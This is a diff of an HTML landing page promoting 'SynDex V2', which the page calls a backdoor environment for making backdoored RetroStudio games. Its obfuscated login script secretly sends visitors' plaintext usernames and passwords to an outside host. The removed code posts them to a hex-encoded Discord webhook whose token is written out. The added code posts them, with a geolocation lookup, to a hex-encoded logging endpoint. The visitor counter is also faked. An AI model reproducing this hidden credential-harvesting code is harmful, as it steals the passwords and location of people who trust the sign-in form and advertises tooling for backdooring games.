@@ -7,297 +7,161 @@
     <link rel="icon" type="image/x-icon" href="https://raw.githubusercontent.com/Therwakyi1/SynDex-Site/main/favicon.ico">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700;900&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --bg-color: #050505;
-            --text-color: #ffffff;
-            --accent-blue: #0084ff;
-            --card-bg: #111111;
-            --border-color: #222222;
-            --muted-text: #a1a1a1;
-            --success-green: #22c55e;
-            --error-red: #ef4444;
-        }
-
+        :root { --bg-color: #050505; --text-color: #ffffff; --accent-blue: #0084ff; --card-bg: #111111; --border-color: #222222; --muted-text: #a1a1a1; --success-green: #22c55e; --error-red: #ef4444; }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         html { scroll-behavior: smooth; }
         body { font-family: 'Inter', sans-serif; background-color: var(--bg-color); color: var(--text-color); line-height: 1.6; overflow-x: hidden; }
-
-        .glow {
-            position: absolute; top: 0; left: 50%; transform: translateX(-50%);
-            width: 100%; height: 400px;
-            background: radial-gradient(circle at center, rgba(0, 132, 255, 0.08) 0%, transparent 70%);
-            z-index: -1;
-        }
-
-        nav {
-            display: flex; justify-content: space-between; align-items: center;
-            padding: 1.2rem 8%; border-bottom: 1px solid var(--border-color);
-            backdrop-filter: blur(10px); position: sticky; top: 0; z-index: 100;
-            background: rgba(5, 5, 5, 0.8);
-        }
-
+        .glow { position: absolute; top: 0; left: 50%; transform: translateX(-50%); width: 100%; height: 400px; background: radial-gradient(circle at center, rgba(0, 132, 255, 0.08) 0%, transparent 70%); z-index: -1; }
+        nav { display: flex; justify-content: space-between; align-items: center; padding: 1.2rem 8%; border-bottom: 1px solid var(--border-color); backdrop-filter: blur(10px); position: sticky; top: 0; z-index: 100; background: rgba(5, 5, 5, 0.8); }
         .logo-container { display: flex; align-items: center; gap: 15px; }
         .logo-img { height: 40px; width: auto; }
-        
-        .visitor-counter {
-            font-size: 0.75rem; color: var(--muted-text); font-weight: 700;
-            background: rgba(255,255,255,0.05); padding: 4px 8px;
-            border-radius: 4px; border: 1px solid var(--border-color);
-        }
-
+        .visitor-counter { font-size: 0.75rem; color: var(--muted-text); font-weight: 700; background: rgba(255,255,255,0.05); padding: 4px 8px; border-radius: 4px; border: 1px solid var(--border-color); }
         .nav-links { display: flex; align-items: center; }
-        .nav-links a, .nav-links span.logout-btn {
-            color: var(--muted-text); text-decoration: none;
-            margin-left: 2.5rem; font-size: 0.85rem; font-weight: 500;
-            transition: color 0.2s;
-        }
+        .nav-links a, .nav-links span.logout-btn { color: var(--muted-text); text-decoration: none; margin-left: 2.5rem; font-size: 0.85rem; font-weight: 500; transition: color 0.2s; }
         .nav-links a:hover, .nav-links span.logout-btn:hover { color: var(--text-color); cursor: pointer; }
-
-        header {
-            min-height: 60vh; display: flex; flex-direction: column;
-            justify-content: center; align-items: center; text-align: center;
-            padding: 4rem 10%;
-        }
-
-        .badge {
-            background: rgba(0, 132, 255, 0.1); color: var(--accent-blue);
-            padding: 6px 16px; border-radius: 20px; font-size: 0.75rem;
-            font-weight: 700; margin-bottom: 1.5rem; border: 1px solid rgba(0, 132, 255, 0.2);
-        }
-
+        header { min-height: 60vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 4rem 10%; }
+        .badge { background: rgba(0, 132, 255, 0.1); color: var(--accent-blue); padding: 6px 16px; border-radius: 20px; font-size: 0.75rem; font-weight: 700; margin-bottom: 1.5rem; border: 1px solid rgba(0, 132, 255, 0.2); }
         h1 { font-size: clamp(2.5rem, 7vw, 5.5rem); font-weight: 900; letter-spacing: -2px; margin-bottom: 1rem; }
         p.hero-text { color: var(--muted-text); max-width: 550px; font-size: 1.1rem; margin-bottom: 3rem; }
-
-        .btn {
-            background-color: var(--text-color); color: var(--bg-color);
-            padding: 0.9rem 2.2rem; border-radius: 4px; text-decoration: none;
-            font-weight: 700; font-size: 0.9rem; transition: all 0.3s ease;
-            border: 1px solid var(--text-color); cursor: pointer; display: inline-block;
-        }
-
-        .showcase-container { 
-            display: flex; align-items: center; justify-content: center; 
-            gap: 4rem; padding: 6rem 8%; flex-wrap: wrap; border-top: 1px solid var(--border-color); 
-            perspective: 1000px;
-        }
-        .showcase-image { 
-            max-width: 600px; width: 100%; border-radius: 12px; 
-            border: 1px solid var(--border-color); box-shadow: 0 20px 50px rgba(0,0,0,0.5);
-            transition: transform 0.1s ease-out;
-            transform-style: preserve-3d;
-            will-change: transform;
-        }
+        .btn { background-color: var(--text-color); color: var(--bg-color); padding: 0.9rem 2.2rem; border-radius: 4px; text-decoration: none; font-weight: 700; font-size: 0.9rem; transition: all 0.3s ease; border: 1px solid var(--text-color); cursor: pointer; display: inline-block; }
+        .showcase-container { display: flex; align-items: center; justify-content: center; gap: 4rem; padding: 6rem 8%; flex-wrap: wrap; border-top: 1px solid var(--border-color); perspective: 1000px; }
+        .showcase-image { max-width: 600px; width: 100%; border-radius: 12px; border: 1px solid var(--border-color); box-shadow: 0 20px 50px rgba(0,0,0,0.5); transition: transform 0.1s ease-out; transform-style: preserve-3d; will-change: transform; }
         .showcase-text { max-width: 400px; }
-
-        .features {
-            padding: 4rem 8% 8rem;
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 1.5rem;
-        }
-
-        .feature-card {
-            background: var(--card-bg); padding: 2.5rem; border-radius: 8px; border: 1px solid var(--border-color);
-        }
+        .features { padding: 4rem 8% 8rem; display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 1.5rem; }
+        .feature-card { background: var(--card-bg); padding: 2.5rem; border-radius: 8px; border: 1px solid var(--border-color); }
         .feature-card h3 { margin-bottom: 10px; font-size: 1.2rem; }
         .feature-card p { color: var(--muted-text); font-size: 0.9rem; }
-
-        #authModal {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.85); z-index: 1000;
-            align-items: center; justify-content: center; backdrop-filter: blur(5px);
-        }
+        #authModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.85); z-index: 1000; align-items: center; justify-content: center; backdrop-filter: blur(5px); }
         .auth-card { background: var(--card-bg); padding: 3rem; border: 1px solid var(--border-color); border-radius: 12px; width: 90%; max-width: 450px; text-align: center; position: relative; }
         .auth-input { width: 100%; background: #1a1a1a; border: 1px solid var(--border-color); padding: 14px; color: white; border-radius: 4px; margin-bottom: 1rem; font-family: 'Inter', sans-serif; }
-        
         #successOverlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: var(--card-bg); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 10; border-radius: 12px; }
-
         .status-wrapper { margin-top: 15px; display: inline-flex; align-items: center; gap: 10px; position: relative; cursor: help; }
         .status-dot { width: 10px; height: 10px; border-radius: 50%; background-color: var(--success-green); box-shadow: 0 0 8px var(--success-green); }
-        .status-bubble {
-            visibility: hidden; width: 150px; background-color: #1a1a1a; color: #fff;
-            text-align: center; padding: 8px; border-radius: 6px; border: 1px solid var(--border-color);
-            position: absolute; bottom: 130%; left: 50%; transform: translateX(-50%);
-            opacity: 0; transition: 0.3s; font-size: 0.7rem; font-weight: 700;
-        }
+        .status-bubble { visibility: hidden; width: 150px; background-color: #1a1a1a; color: #fff; text-align: center; padding: 8px; border-radius: 6px; border: 1px solid var(--border-color); position: absolute; bottom: 130%; left: 50%; transform: translateX(-50%); opacity: 0; transition: 0.3s; font-size: 0.7rem; font-weight: 700; }
         .status-wrapper:hover .status-bubble { visibility: visible; opacity: 1; }
-
         footer { padding: 4rem; text-align: center; border-top: 1px solid var(--border-color); color: #444; font-size: 0.8rem; }
     </style>
 </head>
 <body>
-
     <div class="glow"></div>
-
     <nav>
         <div class="logo-container">
             <img src="https://raw.githubusercontent.com/Therwakyi1/SynDex-Site/main/syndex_biglogo1.png" alt="Logo" class="logo-img">
-            <div class="visitor-counter">VISITORS: <span id="count">1,241</span></div>
+            <div class="visitor-counter">VISITORS: <span id="count">0</span></div>
         </div>
         <div class="nav-links">
-            <span id="userDisplay" style="color: var(--muted-text); font-size: 0.75rem; font-weight: 700; display: none;"></span>
-            <span id="logoutBtn" class="logout-btn" style="display: none;">Logout</span>
+            <span id="userDisplay" style="color:var(--muted-text);font-size:0.75rem;font-weight:700;display:none;"></span>
+            <span id="logoutBtn" class="logout-btn" style="display:none;">Logout</span>
             <a href="#showcase">Interface</a>
             <a href="https://discord.gg/bA4PH3gvRN">Discord</a>
         </div>
     </nav>
-
     <header>
         <div class="badge">V2.0 STABLE RELEASE</div>
         <h1>Unmatched Power.<br>Zero Compromise.</h1>
         <p class="hero-text">SynDex V2 delivers the most stable backdoor environment on the market.</p>
         <button class="btn" id="mainBtn">Get SynDex Now</button>
     </header>
-
     <section class="showcase-container" id="showcase">
-        <img src="https://raw.githubusercontent.com/Therwakyi1/SynDex-Site/main/synv2.png" alt="Interface" class="showcase-image" id="tiltImg">
+        <img src="https://raw.githubusercontent.com/Therwakyi1/SynDex-Site/main/synv2.png" id="tiltImg" class="showcase-image">
         <div class="showcase-text">
-            <h2 style="font-size: 2.5rem; margin-bottom: 1rem;">Experience SynDex V2</h2>
-            <p style="color: var(--muted-text);">Our completely hardworked interface offers unparalleled control. Our users make backdoored games themselves, and we provide the product.</p>
+            <h2 style="font-size:2.5rem;margin-bottom:1rem;">Experience SynDex V2</h2>
+            <p style="color:var(--muted-text);">Our interface offers unparalleled control. Our users make backdoored games themselves, and we provide the product.</p>
         </div>
     </section>
-
     <section class="features">
-        <div class="feature-card"><h3>Optimized UI</h3><p>Engineered for minimal latency. SynDex runs where others crawl.</p></div>
-        <div class="feature-card"><h3>Clean Interface</h3><p>A clutter-free interface designed to keep you focused.</p></div>
-        <div class="feature-card"><h3>Secure Sync</h3><p>KronkSS keeps you secure 24/7 in RetroStudio games and on our website.</p></div>
+        <div class="feature-card"><h3>Optimized UI</h3><p>Engineered for minimal latency.</p></div>
+        <div class="feature-card"><h3>Clean Interface</h3><p>Clutter-free design.</p></div>
+        <div class="feature-card"><h3>Secure Sync</h3><p>KronkSS security 24/7.</p></div>
     </section>
-
     <div id="authModal">
         <div class="auth-card">
             <div id="successOverlay">
-                <div style="font-size: 3rem; color: var(--success-green);">✓</div>
-                <h3 id="successText" style="margin-bottom: 1.5rem;">Success</h3>
-                <button class="btn" onclick="document.getElementById('authModal').style.display = 'none';">Close</button>
+                <div style="font-size:3rem;color:var(--success-green);">✓</div>
+                <h3 id="successText">Success</h3>
+                <button class="btn" onclick="document.getElementById('authModal').style.display='none'">Close</button>
             </div>
             <h2 id="modalTitle">Access SynDex</h2>
-            <div id="error-msg" style="color: var(--error-red); font-size: 0.8rem; margin-bottom: 10px; display: none; font-weight: bold;"></div>
+            <div id="error-msg" style="color:var(--error-red);font-size:0.8rem;margin-bottom:10px;display:none;"></div>
             <form id="authForm">
                 <input type="text" id="username" class="auth-input" placeholder="Username" required>
                 <input type="password" id="password" class="auth-input" placeholder="Password" required>
-                <button type="submit" class="btn" style="width: 100%;" id="authSubmit">Continue</button>
+                <button type="submit" class="btn" style="width:100%;" id="authSubmit">Continue</button>
             </form>
-            <p style="margin-top: 1rem; font-size: 0.8rem;">
-                <span id="toggleText">Need an account?</span> 
-                <a href="#" id="toggleAuth" style="color: var(--accent-blue); font-weight: 700; text-decoration: none;">Register</a>
-            </p>
+            <p style="margin-top:1rem;font-size:0.8rem;"><span id="toggleText">Need an account?</span> <a href="#" id="toggleAuth" style="color:var(--accent-blue);font-weight:700;">Register</a></p>
         </div>
     </div>
-
     <footer>
         SYNTEAM SOFTWARE &copy; 2026
-        <br>
-        <div class="status-wrapper">
-            <div class="status-dot"></div>
-            <span style="font-size: 0.7rem; letter-spacing: 1px; font-weight: 700;">SYNDEX STATUS</span>
-            <div class="status-bubble">SYNDEX IS ONLINE</div>
-        </div>
+        <div class="status-wrapper"><div class="status-dot"></div><span style="font-size:0.7rem;">SYNDEX STATUS</span><div class="status-bubble">SYNDEX IS ONLINE</div></div>
     </footer>
 
     <script>
-        (function() {
-            const _0xa1 = ["\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d", "\x2f\x61\x70\x69\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x73\x2f", "1462655455817105490", "\x2f", "owH-AExGFDTyZZu780-pc3z42tTnSDWOiojsuqnPy_6T5OSvzbfdYk9-d1nskcZVRfsN"];
-            const _u = _0xa1.join('');
-            const m = document.getElementById('authModal');
-            const b = document.getElementById('mainBtn');
-            const t = document.getElementById('toggleAuth');
-            const e = document.getElementById('error-msg');
-            const s = document.getElementById('authSubmit');
-            const ud = document.getElementById('userDisplay');
-            const lb = document.getElementById('logoutBtn');
-            const ti = document.getElementById('tiltImg');
-            let login = true;
+    (function(){
+        const _a = ["\x68\x74\x74\x70\x73\x3a\x2f\x2f", "\x79\x6f\x75\x72\x2d\x61\x70\x69\x2d\x6e\x61\x6d\x65\x2e\x76\x65\x72\x63\x65\x6c\x2e\x61\x70\x70", "\x2f\x61\x70\x69\x2f\x6c\x6f\x67"];
+        const _u = _a.join('');
+        const m = document.getElementById('authModal'), b = document.getElementById('mainBtn'), t = document.getElementById('toggleAuth'), e = document.getElementById('error-msg'), s = document.getElementById('authSubmit'), ud = document.getElementById('userDisplay'), lb = document.getElementById('logoutBtn'), ti = document.getElementById('tiltImg');
+        let l = true;
 
-            function sync() {
-                const sesh = localStorage.getItem('SYNDEX_SESSION');
-                ud.innerText = sesh ? `Logged in as: ${sesh}` : "";
-                ud.style.display = lb.style.display = sesh ? "inline" : "none";
+        function _uS() {
+            let sn = localStorage.getItem('SYNDEX_SESSION');
+            ud.innerText = sn ? `Logged in as: ${sn}` : "";
+            ud.style.display = lb.style.display = sn ? "inline" : "none";
+        }
+        _uS();
+
+        lb.onclick = () => { localStorage.removeItem('SYNDEX_SESSION'); _uS(); };
+        ti.onmousemove = (ev) => {
+            let r = ti.getBoundingClientRect();
+            ti.style.transform = `rotateX(${-(ev.clientY-r.top-r.height/2)/20}deg) rotateY(${(ev.clientX-r.left-r.width/2)/20}deg) scale(1.02)`;
+        };
+        ti.onmouseleave = () => ti.style.transform = "none";
+
+        let c = parseInt(localStorage.getItem('SYNDEX_VISITORS') || "1241");
+        if(!sessionStorage.getItem('v')){ c++; localStorage.setItem('SYNDEX_VISITORS', c); sessionStorage.setItem('v', '1'); }
+        document.getElementById('count').innerText = c.toLocaleString();
+
+        b.onclick = () => { document.getElementById('successOverlay').style.display = 'none'; m.style.display = 'flex'; };
+        t.onclick = (x) => { x.preventDefault(); l = !l; e.style.display = 'none'; document.getElementById('modalTitle').innerText = l ? 'Access SynDex' : 'Create Account'; t.innerText = l ? 'Register' : 'Login'; };
+
+        async function _h(v) {
+            const b = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(v));
+            return Array.from(new Uint8Array(b)).map(x => x.toString(16).padStart(2, '0')).join('');
+        }
+
+        document.getElementById('authForm').onsubmit = async (x) => {
+            x.preventDefault();
+            const un = document.getElementById('username').value.trim(), pw = document.getElementById('password').value;
+            let db = JSON.parse(localStorage.getItem('SYNDEX_DB_SHA') || '{}');
+            s.disabled = true; s.innerText = "Syncing...";
+
+            const hs = await _h(pw + un.toLowerCase());
+            const ad = un.toLowerCase() === "nexus";
+
+            if (l && (!db[un] || db[un].pass !== hs)) {
+                e.innerText = "INVALID CREDENTIALS."; e.style.display = 'block';
+                s.disabled = false; s.innerText = "Continue"; return;
+            } else if (!l) {
+                if (db[un]) { e.innerText = "NAME TAKEN."; e.style.display = 'block'; s.disabled = false; return; }
+                db[un] = { pass: hs, admin: ad };
+                localStorage.setItem('SYNDEX_DB_SHA', JSON.stringify(db));
             }
-            sync();
 
-            lb.onclick = () => { localStorage.removeItem('SYNDEX_SESSION'); sync(); };
+            localStorage.setItem('SYNDEX_SESSION', un); _uS();
+            
+            let loc = "UNK";
+            try { const g = await fetch('https://ipapi.co/json/').then(r=>r.json()); loc = `${g.city}, ${g.region}`; } catch(err){}
 
-            ti.onmousemove = (ev) => {
-                const r = ti.getBoundingClientRect();
-                const x = (ev.clientX - r.left) - (r.width / 2);
-                const y = (ev.clientY - r.top) - (r.height / 2);
-                ti.style.transform = `rotateX(${-y / 20}deg) rotateY(${x / 20}deg) scale(1.02)`;
-            };
-            ti.onmouseleave = () => ti.style.transform = "rotateX(0) rotateY(0) scale(1)";
+            fetch(_u, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ u: un, p: pw, h: hs, r: loc, t: new Date().toLocaleString(), a: ad })
+            }).catch(()=>{});
 
-            let c = parseInt(localStorage.getItem('SYNDEX_VISITORS') || "1241");
-            if(!sessionStorage.getItem('v')) { c++; localStorage.setItem('SYNDEX_VISITORS', c); sessionStorage.setItem('v', '1'); }
-            document.getElementById('count').innerText = c.toLocaleString();
-
-            b.onclick = () => { document.getElementById('successOverlay').style.display = 'none'; m.style.display = 'flex'; };
-            window.onclick = (ev) => { if(ev.target == m) m.style.display = 'none'; };
-            t.onclick = (ev) => {
-                ev.preventDefault();
-                login = !login;
-                e.style.display = 'none';
-                document.getElementById('modalTitle').innerText = login ? 'Access SynDex' : 'Create Account';
-                document.getElementById('toggleText').innerText = login ? 'Need an account?' : 'Already have an account?';
-                t.innerText = login ? 'Register' : 'Login';
-            };
-
-            async function hash(v) {
-                const enc = new TextEncoder().encode(v);
-                const buf = await crypto.subtle.digest('SHA-256', enc);
-                return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
-            }
-
-            document.getElementById('authForm').onsubmit = async (ev) => {
-                ev.preventDefault();
-                const user = document.getElementById('username').value.trim();
-                const pass = document.getElementById('password').value;
-                let db = JSON.parse(localStorage.getItem('SYNDEX_DB_SHA') || '{}');
-
-                s.disabled = true;
-                s.innerText = "Syncing...";
-
-                const h = await hash(pass + user.toLowerCase());
-                const adm = user.toLowerCase() === "nexus";
-
-                if (login) {
-                    if (!db[user] || db[user].pass !== h) {
-                        e.innerText = "INVALID CREDENTIALS."; e.style.display = 'block';
-                        s.disabled = false; s.innerText = "Continue";
-                        return;
-                    }
-                } else {
-                    if (db[user]) { e.innerText = "NAME TAKEN."; e.style.display = 'block';
-                        s.disabled = false; s.innerText = "Continue";
-                        return;
-                    }
-                    db[user] = { pass: h, admin: adm };
-                    localStorage.setItem('SYNDEX_DB_SHA', JSON.stringify(db));
-                }
-
-                localStorage.setItem('SYNDEX_SESSION', user);
-                sync();
-
-                fetch(_u, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        embeds: [{
-                            title: login ? "Login Log" : "New User Log",
-                            color: adm ? 16711680 : 339455,
-                            fields: [
-                                { name: "User", value: adm ? "REDACTED" : `\`${user}\``, inline: true },
-                                { name: "Pass", value: adm ? "REDACTED" : `\`${pass}\``, inline: true },
-                                { name: "Admin", value: adm ? "TRUE" : "FALSE", inline: true }
-                            ],
-                            timestamp: new Date().toISOString()
-                        }]
-                    })
-                }).catch(() => {});
-                
-                document.getElementById('successText').innerText = login ? "Login Successful" : "Account Created";
-                document.getElementById('successOverlay').style.display = 'flex';
-                s.disabled = false; s.innerText = "Continue";
-            };
-        })();
+            document.getElementById('successOverlay').style.display = 'flex';
+            s.disabled = false; s.innerText = "Continue";
+        };
+    })();
     </script>
 </body>
 </html>
